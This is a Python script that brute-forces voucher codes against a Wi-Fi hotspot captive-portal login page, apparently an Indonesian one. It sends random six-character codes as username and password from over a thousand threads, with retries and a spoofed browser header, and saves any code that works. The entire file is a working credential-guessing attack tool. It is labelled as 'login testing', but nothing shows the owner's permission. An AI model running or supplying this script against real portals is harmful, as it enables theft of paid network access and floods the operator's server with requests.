   #!/usr/bin/env python3
import random
import requests 
import string
import threading
import time
import os
import sys
import json
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter

# Advanced Configuration
TARGET_URL = "http://mjm.hotspot/login" # ganti jadi url 
MAX_WORKERS = 1080 # Thread count - can be adjusted
RETRY_LIMIT = 300  # Retries for failed requests
TIMEOUT = 50      # Request timeout in seconds
CODE_LENGTH = 6  # Code length
SUCCESS_FILE = "anos_log.txt"
STATS_FILE = "login_stats.json"
UPDATE_INTERVAL = 100000  # Status update interval in seconds

# ANSI Color codes for console output
class Colors:
    HEADER = '\033[95;1m'
    BLUE = '\033[94;1m'
    CYAN = '\033[96;1m'
    GREEN = '\033[92;1m'
    YELLOW = '\033[93;1m'
    RED = '\033[91;1m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Statistics tracking
stats = {
    "start_time": None,
    "attempts": 0,
    "successes": 0,
    "failures": 0,
    "errors": 0,
    "already_active": 0,
    "response_times": [],
    "last_update": None
}

# Session management
def create_session():
    """Create and configure a requests session with proper settings"""
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        max_retries=0,  # We handle retries manually
        pool_connections=MAX_WORKERS,
        pool_maxsize=MAX_WORKERS*2
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def log_message(message, level="INFO"):
    """Log message to console and file with color formatting"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted_msg = f"[{timestamp}] [{level}] {message}"
    
    # Color mapping for terminal output
    color_start = ""
    if level == "ERROR":
        color_start = Colors.RED
    elif level == "WARN":
        color_start = Colors.YELLOW
    elif level == "SUCCESS":
        color_start = Colors.GREEN
    elif level == "SYSTEM":
        color_start = Colors.CYAN + Colors.BOLD
    elif level == "INFO":
        color_start = Colors.BLUE
    
    # Print to console with color
    print(f"{color_start}{formatted_msg}{Colors.ENDC}")
    
# Improved code generation
def generate_code(length=CODE_LENGTH):
    """Generate random code with customized character set
    
    This can be adjusted based on what the target accepts
    """
    # Using a more selective character set to avoid ambiguous characters
    char_set = string.ascii_uppercase + string.digits
    # Remove potentially confusing characters
    char_set = char_set.replace('O', '').replace('0', '').replace('I', '').replace('1', '')
    return ''.join(random.choices(char_set, k=length))

# File handling
def save_success(code, response_time=None):
    """Save successful code with more details"""
    try:
        with open(SUCCESS_FILE, "a") as file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            details = f"{timestamp} - CODE: {code}"
            if response_time:
                details += f" - Response Time: {response_time:.2f}s"
            file.write(f"{details}\n")
    except Exception as e:
        log_message(f"Error saving success: {str(e)}", "ERROR")

def save_statistics():
    """Save current statistics to a JSON file"""
    try:
        current_stats = stats.copy()
        current_stats["duration"] = (datetime.now() - stats["start_time"]).total_seconds() if stats["start_time"] else 0
        current_stats["start_time"] = current_stats["start_time"].isoformat() if current_stats["start_time"] else None
        current_stats["last_update"] = current_stats["last_update"].isoformat() if current_stats["last_update"] else None
        
        # Calculate average response time
        if stats["response_times"]:
            current_stats["avg_response_time"] = sum(stats["response_times"]) / len(stats["response_times"])
        else:
            current_stats["avg_response_time"] = 0
            
        # Only keep the last 100 response times to avoid huge files
        current_stats["response_times"] = stats["response_times"][-100:]
        
        with open(STATS_FILE, "w") as file:
            json.dump(current_stats, file, indent=4)
    except Exception as e:
        log_message(f"Error saving statistics: {str(e)}", "ERROR")

# Enhanced login attempt function
def try_login(session=None):
    """Try to login with generated code and return result with detailed status"""
    global stats
    
    if session is None:
        session = create_session()
    
    # Generate the same code for both username and password
    code = generate_code()
    
    data = {
        "username": code,
        "password": code
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://Jk.hotspot.id",
        "Referer": "http://Jk.hotspot.id/login",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "DNT": "1"
    }
    
    result = {
        "success": False,
        "code": code,
        "status_code": None,
        "message": "",
        "response_time": 0
    }
    
   # os.system('clear')
    
    for attempt in range(RETRY_LIMIT):
        try:
            start_time = time.time()
            response = session.post(
                TARGET_URL, 
                data=data, 
                headers=headers,
                timeout=TIMEOUT,
                allow_redirects=False
            )
            end_time = time.time()
            response_time = end_time - start_time
            
            # Update statistics
            stats["response_times"].append(response_time)
            stats["attempts"] += 1
            
            result["status_code"] = response.status_code
            result["response_time"] = response_time
            
            # Check for successful login
            if response.status_code == 302 and "success" in response.headers.get("Location", "").lower():
                log_message(f"CODE: {code} - LOGIN SUCCESSFUL! ⭐ ({response_time:.2f}s)", "SUCCESS")
                save_success(code, response_time)
                result["success"] = True
                result["message"] = "Login successful"
                stats["successes"] += 1
                return result
            
            # Check for specific error messages
            elif response.status_code == 200:
                if "sudah diaktifkan" in response.text.lower():
                    log_message(f"CODE: {code} - ALREADY ACTIVATED ({response_time:.2f}s)", "INFO")
                    result["message"] = "Code already activated"
                    stats["already_active"] += 1
                elif "invalid" in response.text.lower() or "salah" in response.text.lower():
                    log_message(f"CODE: {code} - INVALID CODE ({response_time:.2f}s)", "INFO")
                    result["message"] = "Invalid code"
                    stats["failures"] += 1
                else:
                    log_message(f"CODE: {code} - UNKNOWN RESPONSE ({response_time:.2f}s)", "WARN")
                    result["message"] = "Unknown response"
                    stats["failures"] += 1
                return result
            else:
                log_message(f"CODE: {code} - STATUS {response.status_code} ({response_time:.2f}s)", "WARN")
                result["message"] = f"Unexpected status code: {response.status_code}"
                stats["failures"] += 1
                # No return here to allow retry for unexpected status codes
            
        except requests.exceptions.Timeout:
            if attempt < RETRY_LIMIT - 1:
                log_message(f"CODE: {code} - TIMEOUT, RETRYING ({attempt+1}/{RETRY_LIMIT})", "WARN")
                time.sleep(1)  # Short delay before retry
            else:
                log_message(f"CODE: {code} - REQUEST TIMED OUT AFTER {RETRY_LIMIT} ATTEMPTS", "ERROR")
                result["message"] = "Request timed out"
                stats["errors"] += 1
                return result
                
        except requests.RequestException as e:
            if attempt < RETRY_LIMIT - 1:
                log_message(f"CODE: {code} - ERROR: {str(e)}, RETRYING ({attempt+1}/{RETRY_LIMIT})", "WARN")
                time.sleep(1)  # Short delay before retry
            else:
                log_message(f"CODE: {code} - REQUEST FAILED: {str(e)}", "ERROR")
                result["message"] = f"Request failed: {str(e)}"
                stats["errors"] += 1
                return result
    
    return result

# Progress display functions
def display_banner():
    """Display a cool ASCII art banner"""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██       ██████   ██████  ██ ███    ██     ████████ ██████  ║
║   ██      ██    ██ ██       ██ ████   ██        ██    ██   ██ ║
║   ██      ██    ██ ██   ███ ██ ██ ██  ██        ██    ██████  ║
║   ██      ██    ██ ██    ██ ██ ██  ██ ██        ██    ██   ██ ║
║   ███████  ██████   ██████  ██ ██   ████        ██    ██   ██ ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.ENDC}
{Colors.GREEN}Target: {TARGET_URL}{Colors.ENDC}
{Colors.BLUE}Workers: {MAX_WORKERS} | Timeout: {TIMEOUT}s | Retry Limit: {RETRY_LIMIT}{Colors.ENDC}
"""
    print(banner)

def display_progress():
    """Display current progress statistics"""
    if stats["start_time"] is None:
        return
        
    duration = (datetime.now() - stats["start_time"]).total_seconds()
    attempts_per_second = stats["attempts"] / duration if duration > 0 else 0
    
    # Calculate success rate
    success_rate = (stats["successes"] / stats["attempts"] * 100) if stats["attempts"] > 0 else 0
    
    # Get average response time
    avg_response = sum(stats["response_times"]) / len(stats["response_times"]) if stats["response_times"] else 0
    
    print(f"\n{Colors.BOLD}===== PROGRESS UPDATE ====={Colors.ENDC}")
    print(f"{Colors.BLUE}Runtime: {format_time(duration)}{Colors.ENDC}")
    print(f"{Colors.GREEN}Attempts: {stats['attempts']} ({attempts_per_second:.2f}/sec){Colors.ENDC}")
    print(f"{Colors.GREEN}Successes: {stats['successes']} ({success_rate:.2f}%){Colors.ENDC}")
    print(f"{Colors.YELLOW}Already Active: {stats['already_active']}{Colors.ENDC}")
    print(f"{Colors.RED}Failures: {stats['failures']}{Colors.ENDC}")
    print(f"{Colors.RED}Errors: {stats['errors']}{Colors.ENDC}")
    print(f"{Colors.CYAN}Avg Response Time: {avg_response:.3f}s{Colors.ENDC}")
    print(f"{Colors.BOLD}========================={Colors.ENDC}\n")

def format_time(seconds):
    """Format seconds into a readable time string"""
    hours, remainder = divmod(int(seconds), 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

# Signal handlers for graceful termination
def handle_interrupt(signum, frame):
    """Handle keyboard interrupt gracefully"""
    log_message("PROGRAM STOPPING... (CTRL+C detected)", "SYSTEM")
    display_progress()
    save_statistics()
    log_message("PROGRAM STOPPED GRACEFULLY", "SYSTEM")
    sys.exit(0)

    os.system('clear')

# Main execution with improved threading management
def main():
    """Main execution function"""
    # Setup signal handlers
    signal.signal(signal.SIGINT, handle_interrupt)
    
    # Initialize
    display_banner()
    log_message("STARTING LOGIN TESTING PROCESS", "SYSTEM")
    
    # Initialize statistics
    global stats
    stats["start_time"] = datetime.now()
    stats["last_update"] = datetime.now()
    
    # Create persistent session for efficiency
    session = create_session()
    
    # Create progress update thread
    def update_thread():
        while True:
            time.sleep(UPDATE_INTERVAL)
            current_time = datetime.now()
            if (current_time - stats["last_update"]).total_seconds() >= UPDATE_INTERVAL:
                display_progress()
                save_statistics()
                stats["last_update"] = current_time
    
    # Start background thread for progress updates
    threading.Thread(target=update_thread, daemon=True).start()
    
    try:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            while True:
                # Submit batch of tasks
                futures = [executor.submit(try_login, session) for _ in range(MAX_WORKERS)]
                
                # Process completed tasks
                for future in as_completed(futures):
                    try:
                        result = future.result()
                        # Individual result processing can be added here if needed
                    except Exception as e:
                        log_message(f"Task execution error: {str(e)}", "ERROR")
                
                # Small delay to prevent CPU overuse on small MAX_WORKERS values
                if MAX_WORKERS < 5:
                    time.sleep(0.1)
                
    except Exception as e:
        log_message(f"CRITICAL ERROR: {str(e)}", "ERROR")
        display_progress()
        save_statistics()
        sys.exit(1)

if __name__ == "__main__":
    main()